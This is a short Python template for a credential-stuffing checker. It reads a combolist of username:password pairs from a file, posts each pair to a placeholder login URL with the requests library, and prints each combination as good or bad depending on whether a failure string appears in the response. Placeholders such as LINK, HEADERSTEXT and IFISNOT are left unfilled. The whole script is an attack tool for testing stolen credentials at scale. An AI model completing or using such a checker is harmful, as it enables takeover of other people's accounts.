import requests

combolist = open("PATHTEXT", "r").readlines()

url = "LINK"

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")

    USER = acc[0]
    PASS = acc[1]
    account = USER + ":" + PASS

    headers = {
        HEADERSTEXT
    }

    req = requests.REQM(url, data=headers).text

    if not "IFISNOT" in req:
        print("GOODTEXT " + account)
    else:
        print("BADTEXT " + account)